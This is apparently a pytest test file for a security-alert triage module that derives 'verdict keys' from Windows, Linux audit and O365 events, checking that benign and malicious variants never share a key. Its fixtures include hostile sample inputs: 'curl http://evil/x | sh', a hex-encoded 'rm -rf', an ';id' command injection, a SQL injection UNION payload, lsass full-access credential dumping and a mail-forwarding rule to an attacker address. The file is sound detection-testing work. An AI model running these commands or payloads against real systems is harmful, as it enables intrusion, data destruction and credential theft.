"""Verdict keys refine the fingerprint with what ran, compared in full: nothing an attacker writes is masked or cut."""

from __future__ import annotations

from typing import Any, Dict, Optional

import pytest

from lg_sotf.domain.verdict_key import behaviour, normalize_value, verdict_key, verdict_key_of
from lg_sotf.models.alert import TRUNCATED_MARKER

pytestmark = pytest.mark.unit

FP = "a" * 64
SYSMON_19 = {"eventID": "19", "providerName": "Microsoft-Windows-Sysmon"}


def _service(name: str, image: str) -> Dict[str, Any]:
    return {"unmapped": {"data": {"win": {
        "system": {"eventID": "7045", "processID": "1508", "eventRecordID": "432727"},
        "eventdata": {"serviceName": name, "imagePath": image, "accountName": "LocalSystem"},
    }}}}


def _audit(uid: str, pid: str = "46031", args: tuple[str, ...] = ("ps", "aux")) -> Dict[str, Any]:
    return {"unmapped": {"data": {"audit": {
        "exe": "/usr/bin/ps", "command": "ps", "uid": uid, "euid": uid, "pid": pid, "ppid": "24434",
        "execve": {f"a{i}": a for i, a in enumerate(args)},
    }}}}


def _key(raw: Dict[str, Any], entities: Optional[Dict[str, Any]] = None) -> Optional[str]:
    return verdict_key(FP, {"entities": entities or {}, "unmapped": {}}, raw)


def test_a_different_service_on_the_same_host_has_another_key() -> None:
    edge = _service("edgeupdate", "C:\\\\Program Files (x86)\\\\Microsoft\\\\EdgeUpdate\\\\MicrosoftEdgeUpdate.exe /svc")
    psexec = _service("PSEXESVC", "%SystemRoot%\\\\PSEXESVC.exe")
    assert verdict_key(FP, edge) != verdict_key(FP, psexec)
    assert behaviour(psexec) == {"accountname": ["LocalSystem"], "imagepath": ["%systemroot%\\psexesvc.exe"],
                                 "servicename": ["PSEXESVC"]}


def test_the_same_command_as_another_user_has_another_key() -> None:
    assert verdict_key(FP, _audit("33")) != verdict_key(FP, _audit("0"))
    assert behaviour(_audit("33"))["command"] == ["ps", "ps aux"]


def test_repeats_of_the_same_activity_share_a_key() -> None:
    """Process ids, event ids and record numbers are never read."""
    assert verdict_key(FP, _audit("0", pid="1")) == verdict_key(FP, _audit("0", pid="99999"))
    first, again = _service("edgeupdate", "x.exe"), _service("edgeupdate", "x.exe")
    again["unmapped"]["data"]["win"]["system"]["processID"] = "2732"
    assert verdict_key(FP, first) == verdict_key(FP, again)
    assert verdict_key(FP, first) != verdict_key("b" * 64, first)
    assert verdict_key(None, first) is None and verdict_key("", first) is None


def test_only_layout_is_normalised() -> None:
    assert normalize_value("commandline", "  ps   aux ") == "ps aux"
    assert normalize_value("image", "C:\\\\Windows\\\\System32\\\\CMD.EXE") == "c:\\windows\\system32\\cmd.exe"
    # A Linux path and a command line keep their case: /tmp/X and /tmp/x are different files, base64 is case-bound.
    assert normalize_value("image", "/tmp/Payload") == "/tmp/Payload"
    assert normalize_value("commandline", "powershell -enc SQBFAFgA") == "powershell -enc SQBFAFgA"


@pytest.mark.parametrize(
    ("benign", "attack"),
    [
        # Reviewer's probes (PR #344): every one of these collided while values were masked or cut.
        ({"commandLine": "python3 -c exec(bytes.fromhex('7072696e742822686922292020'))"},
         {"commandLine": "python3 -c exec(bytes.fromhex('696d706f7274206f733b6f732e73797374656d2827726d202d72662027'))"}),
        ({"image": "C:\\Users\\bob\\AppData\\Local\\Temp\\tmp4A2B.exe", "user": "bob"},
         {"image": "C:\\Users\\bob\\AppData\\Local\\Temp\\tmpEVIL.exe", "user": "bob"}),
        ({"commandLine": "curl -o /dev/null https://cdn.vendor.com/agent/1234567/update.bin"},
         {"commandLine": "curl -o /dev/null https://cdn.vendor.com/agent/7654321/update.bin"}),
        ({"image": "C:\\ProgramData\\{6F9619FF-8B86-D011-B42D-00CF4FC964FF}\\setup.exe"},
         {"image": "C:\\ProgramData\\{0A1B2C3D-0000-1111-2222-333344445555}\\setup.exe"}),
        ({"commandLine": "job --at 2026-10-20T04:01:53Z"}, {"commandLine": "job --at 2026-10-21T05:11:00Z;id"}),
        ({"image": "/tmp/payload"}, {"image": "/tmp/Payload"}),
        ({"commandLine": "powershell -enc SQBFAFgA"}, {"commandLine": "powershell -enc sqbfafga"}),
        ({"image": "/usr/bin/id", "subjectUserName": "alice", "targetUserName": "admin"},
         {"image": "/usr/bin/id", "subjectUserName": "admin", "targetUserName": "alice"}),
        ({"process": {"executable": "/bin/bash", "parent": {"executable": "/usr/sbin/sshd"}}},
         {"process": {"executable": "/usr/sbin/sshd", "parent": {"executable": "/bin/bash"}}}),
        ({"process": {"executable": "/usr/bin/ps", "command_line": "ps aux"}, "user": {"name": "root", "id": "0"}},
         {"process": {"executable": "/usr/bin/ps", "command_line": "ps aux"}, "user": {"name": "www-data", "id": "33"}}),
        ({"Service": {"RuntimeDetails": {"Process": {"Name": "kworker", "ExecutablePath": "/usr/lib/agent/kworker"}}}},
         {"Service": {"RuntimeDetails": {"Process": {"Name": "kworker", "ExecutablePath": "/tmp/.x/kworker"}}}}),
        ({"FileName": "powershell.exe", "InitiatingProcessFileName": "svchost.exe"},
         {"FileName": "powershell.exe", "InitiatingProcessFileName": "w3wp.exe"}),
        ({"image": "C:\\Windows\\System32\\reg.exe", "targetObject": "HKLM\\Run\\OneDrive", "details": "C:\\OneDrive.exe"},
         {"image": "C:\\Windows\\System32\\reg.exe", "targetObject": "HKLM\\Run\\Evil", "details": "C:\\Users\\Public\\e.exe"}),
        ({"win": {"eventdata": {"taskName": "\\GoogleUpdateTaskMachineUA", "taskContent": "<Command>G.exe</Command>"}}},
         {"win": {"eventdata": {"taskName": "\\Updater", "taskContent": "<Command>C:\\Users\\Public\\b.exe</Command>"}}}),
        ({"system": SYSMON_19, "eventdata": {"operation": "Created", "name": "SCM Filter", "query": "SELECT * FROM X"}},
         {"system": SYSMON_19, "eventdata": {"operation": "Created", "name": "Updater", "query": "SELECT * FROM Y"}}),
        ({"sourceImage": "C:\\Windows\\System32\\svchost.exe", "targetImage": "C:\\Windows\\System32\\lsass.exe",
          "grantedAccess": "0x1000"},
         {"sourceImage": "C:\\Windows\\System32\\svchost.exe", "targetImage": "C:\\Windows\\System32\\lsass.exe",
          "grantedAccess": "0x1FFFFF", "callTrace": "C:\\Windows\\SYSTEM32\\ntdll.dll+9d204|UNKNOWN(1ABCDE)"}),
        ({"image": "C:\\inetpub\\w3wp.exe", "url": "https://shop/search?q=o'reilly+books"},
         {"image": "C:\\inetpub\\w3wp.exe", "url": "https://shop/search?q=1' UNION SELECT password FROM users--"}),
    ],
)
def test_attacker_writable_differences_never_share_a_key(benign: Dict[str, Any], attack: Dict[str, Any]) -> None:
    benign_key, attack_key = _key(benign), _key(attack)
    assert benign_key is not None and attack_key is not None
    assert benign_key != attack_key


def test_a_value_is_compared_in_full() -> None:
    """H2: a payload appended past any length still changes the key; an oversized value gets no key at all."""
    long = "/usr/bin/python3 /opt/monitor/collect.py " + "--metric cpu " * 40
    assert _key({"commandLine": long}) != _key({"commandLine": long + " ; curl http://evil/x | sh"})
    assert _key({"commandLine": "x" * 20_000}) is None


def test_no_process_command_service_or_named_object_means_no_key() -> None:
    """H1: users alone would make the key the fingerprint again."""
    assert _key({"subjectUserName": "SYSTEM", "logonType": "5"}) is None
    assert _key({}) is None
    assert _key({"subjectUserName": "SYSTEM"}, entities={"processes": ["c:\\windows\\system32\\svchost.exe"]})


@pytest.mark.parametrize(
    ("mitre", "keyed"),
    [
        ({"techniques": ["T1053.005"]}, False),  # scheduled task: named persistence
        ({"techniques": ["T1003.001"]}, False),  # credential dumping
        ({"tactics": ["Credential Access"]}, False),
        ({"techniques": ["T1070"]}, False),  # log clearing
        ({"techniques": ["T1057"]}, True),  # process discovery
        ({}, True),  # unmapped keeps a key: analysts decided this exact behaviour twice
    ],
)
def test_never_close_classes_get_no_key(mitre: Dict[str, Any], keyed: bool) -> None:
    normalized = {"entities": {"processes": ["c:\\users\\public\\b.exe"]}, "mitre": mitre}
    assert (verdict_key(FP, normalized) is not None) is keyed


def test_a_model_normalised_alert_gets_no_key() -> None:
    normalized = {"entities": {"processes": ["c:\\windows\\system32\\svchost.exe"]}, "flags": ["llm_normalized"]}
    assert verdict_key(FP, normalized) is None


def test_entities_and_raw_are_read_too() -> None:
    by_entity = {"entities": {"processes": ["C:\\Windows\\System32\\cmd.exe"], "command_lines": ["cmd /c whoami"]}}
    assert behaviour(by_entity) == {"commandlines": ["cmd /c whoami"], "processes": ["c:\\windows\\system32\\cmd.exe"]}
    raw = {"event": {"ParentImage": "C:\\Windows\\explorer.exe", "User": "CORP\\alice", "ProcessId": 4242}}
    assert behaviour({}, raw) == {"parentimage": ["c:\\windows\\explorer.exe"], "user": ["CORP\\alice"]}


def test_an_incomplete_alert_never_gets_a_key() -> None:
    assert verdict_key(FP, {"unmapped": {TRUNCATED_MARKER: {"original_bytes": 99_999}, "preview": "{}"}}) is None
    assert verdict_key(FP, {}, {"data": {TRUNCATED_MARKER: {"original_bytes": 1}}}) is None
    too_many = {"unmapped": {"events": [{"image": f"p{i}.exe"} for i in range(40)]}}
    assert verdict_key(FP, too_many) is None
    deep: Dict[str, Any] = {"image": "x.exe"}
    for _ in range(20):
        deep = {"n": deep}
    assert verdict_key(FP, {"unmapped": deep}) is None


def test_verdict_key_of_a_stored_alert() -> None:
    class Row:
        fingerprint = FP
        normalized = _audit("33")
        raw: Dict[str, Any] = {}

    assert verdict_key_of(Row()) == verdict_key(FP, _audit("33"), {})
    assert verdict_key_of({"fingerprint": FP, "normalized": _audit("33"), "raw": None}) == verdict_key(FP, _audit("33"))
    assert verdict_key_of({"fingerprint": FP, "normalized": None}) is None


@pytest.mark.parametrize(
    "event",
    [
        # Set by whoever sends the request, or too generic to say what ran: in the key, never enough for one.
        {"http_user_agent": "Mozilla/5.0 (Windows NT 10.0) Chrome/120", "url": "https://shop/item?id=5"},
        {"Operation": "New-InboxRule", "UserId": "ceo@corp", "Parameters": [{"Name": "ForwardTo", "Value": "x@evil"}]},
        {"details": "Login succeeded", "user": "bob"},
        {"query": "updates.vendor.com", "destination": "10.0.0.5"},
        {"win": {"eventdata": {"name": "Microsoft-Windows-Something", "subjectUserName": "bob"}}},  # not Sysmon WMI
        {"consumer": "SCM Event Log Consumer", "filter": "SCM Event Log Filter"},  # not Sysmon WMI
    ],
)
def test_context_alone_never_makes_a_key(event: Dict[str, Any]) -> None:
    """N1: a user agent, URL, O365 operation or generic WMI-looking field is attacker-set or generic."""
    assert _key(event) is None


def test_wmi_fields_anchor_only_sysmon_wmi_events() -> None:
    wmi = {"name": "Updater", "consumer": "CommandLineEventConsumer"}
    assert _key({"win": {"system": SYSMON_19, "eventdata": wmi}}) is not None
    assert _key({"win": {"system": {**SYSMON_19, "eventID": "1"}, "eventdata": wmi}}) is None
    assert _key({"win": {"system": {**SYSMON_19, "providerName": "Other"}, "eventdata": wmi}}) is None


def test_o365_parameters_are_part_of_the_key() -> None:
    def rule(forward: str) -> Dict[str, Any]:
        return {"Operation": "New-InboxRule", "Parameters": [{"Name": "ForwardTo", "Value": forward}]}

    with_process = {"processes": ["c:\\program files\\exchange\\msexchange.exe"]}
    assert _key(rule("archive@corp"), with_process) != _key(rule("attacker@evil.example"), with_process)


def test_o365_parameters_past_the_cap_give_no_key() -> None:
    """Repeated benign parameters must not hide one appended past the cap (PR #344 final review)."""
    benign = [{"Name": "MoveToFolder", "Value": "Archive"}] * 40
    malicious = benign + [{"Name": "ForwardTo", "Value": "attacker@evil.example"}]
    with_process = {"processes": ["c:\\program files\\exchange\\msexchange.exe"]}
    assert _key({"Operation": "New-InboxRule", "Parameters": malicious}, with_process) is None
    assert _key({"Operation": "New-InboxRule", "Parameters": benign}, with_process) is None
